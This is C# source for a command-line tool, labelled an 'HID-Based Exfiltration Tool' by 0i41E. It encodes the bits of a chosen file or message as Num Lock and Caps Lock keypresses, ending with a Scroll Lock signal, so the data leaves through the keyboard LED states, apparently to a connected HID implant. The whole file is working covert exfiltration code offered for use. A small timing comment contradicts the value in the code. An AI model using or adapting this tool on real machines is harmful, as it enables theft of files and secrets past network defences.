using System;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

class Program
{
    // Define the ASCII art logo as a constant string
    const string Logo = @"
        ______      _         _____  _____                 
        |  _  \    | |       / __  \/  __ \                
        | | | |__ _| |_ __ _ `' / /'| /  \/ __ _ _ __  ___ 
        | | | / _` | __/ _` |  / /  | |    / _` | '_ \/ __|
        | |/ / (_| | || (_| |./ /___| \__/\ (_| | |_) \__ \
        |___/ \__,_|\__\__,_|\_____/ \____/\__,_| .__/|___/
                                                | |        
                                                |_|     
                                                     by 0i41E
    ";

    static void Main(string[] args)
    {
        string input = "";
        bool isFile = false;
        bool isMessage = false;

        // Check if any arguments were provided
        if (args.Length == 0)
        {
            ShowHelpMenu();
            return;
        }

        // Parse the arguments
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "/file")
            {
                isFile = true;
                if (i + 1 < args.Length)
                {
                    string filePath = args[i + 1];
                    if (File.Exists(filePath))
                    {
                        input = File.ReadAllText(filePath);
                    }
                    else
                    {
                        Console.WriteLine($"Error: File '{filePath}' not found.");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine("Error: Missing file path after /File argument.");
                    return;
                }
            }
            else if (args[i] == "/message")
            {
                isMessage = true;
                if (i + 1 < args.Length)
                {
                    input = args[i + 1];
                }
                else
                {
                    Console.WriteLine("Error: Missing message after /Message argument.");
                    return;
                }
            }
        }

        if (!isFile && !isMessage)
        {
            ShowHelpMenu();
            return;
        }

        string convertedInput = input;

        // Convert input to a char array
        char[] charArray = convertedInput.ToCharArray();

        string keysToSend = "";

        // Start a timer to measure the execution time
        Stopwatch stopwatch = Stopwatch.StartNew();

        // Iterate through each character in the char array
        foreach (char character in charArray)
        {
            // Iterate through each bit in the character
            for (int i = 7; i >= 0; i--)
            {
                // Check if the bit is set
                if ((character & (1 << i)) != 0)
                {
                    keysToSend += "{NUMLOCK}";
                }
                else
                {
                    keysToSend += "{CAPSLOCK}";
                }
            }
        }

        keysToSend += "{SCROLLLOCK}";

        // Stop the timer
        stopwatch.Stop();

        // Estimate the total time required (this is a rough estimate)
        double estimatedTime = charArray.Length * 8 * 0.035; // Assuming each bit takes 0.01 seconds to process

        // Display the estimated time until completion
        Console.WriteLine(Logo);
        Console.WriteLine("");
        Console.WriteLine($"Estimated time until completion: {estimatedTime:F2} seconds");

        // Send the keys using SendKeys
        SendKeys.SendWait(keysToSend);
    }

    static void ShowHelpMenu()
    {
        Console.WriteLine(Logo);
        Console.WriteLine("");
        Console.WriteLine("HID-Based Exfiltration Tool");
        Console.WriteLine("");
        Console.WriteLine("Usage:");
        Console.WriteLine("  /file <file_path>   Convert the contents of the specified file.");
        Console.WriteLine("  /message <message>  Convert the specified message.");
    }
}
